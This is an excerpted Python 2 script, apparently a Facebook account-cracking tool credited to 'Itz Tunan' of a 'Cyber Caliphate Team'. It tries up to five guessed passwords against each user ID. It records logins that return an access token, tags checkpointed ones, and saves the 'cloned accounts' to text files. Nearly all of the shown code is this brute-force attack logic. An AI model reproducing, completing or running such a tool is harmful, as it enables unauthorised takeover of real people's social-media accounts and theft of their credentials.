# MY FD ID @Sk. Safiuddin
# MY FB  GROUP @CCT
#MY GITHUB HTTPS://GITHUB.COM/ITS-TUNAN
#THIS SCRIPT PAID
...
Mking_page = random.choice(["https://www.facebook.com/S3X.BUT.Ok69"])

page = Mking_page

def youtube():
	Style_profaisor("  please follow my Facebook id :) Thank you")
	os.system("xdg-open https://www.facebook.com/S3X.BUT.Ok69")
	menu()
...
#Mking Logo
logo ="""
    ___ _____ ____    _____ _   _ _   _    _    _   _ 
 |_ _|_   _/ ___|  |_   _| | | | \ | |  / \  | \ | |
  | |  | | \___ \    | | | | | |  \| | / _ \ |  \| |
  | |  | |  ___) |   | | | |_| | |\  |/ ___ \| |\  |
 |___| |_| |____/    |_|  \___/|_| \_/_/   \_\_| \_|
                                                      
                                                 

\033[1;97m--------------------------------------------------
\033[1;91m Author      : Itz Tunan 
\033[1;91m GitHub      : https://github.com/ITS-TUNAN
\033[1;91m Group    : Cyber Caliphate Team
\033[1;91m I Itz Not A Name, Itz A Brand
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY Itz Tunan'
        print '\x1b[1;92m THISE SCRIPT CREATED BY Itz Tunan  '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[TUNAN_OK] ' + k + c + user + ' | ' + pass1
                okb = open('Mking.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[TUNAN_CP] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[TUNAN_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Mking.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[TUNAN_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[TUNAN_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('TUNAN.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[TUNAN_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('TUNAN.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[TUNAN_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('TUNAN.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[TUNAN_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('TUNAN.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[TUNAN_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('TUNAN.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[TUNAN_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('TUNAN.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : TUNAN.txt'
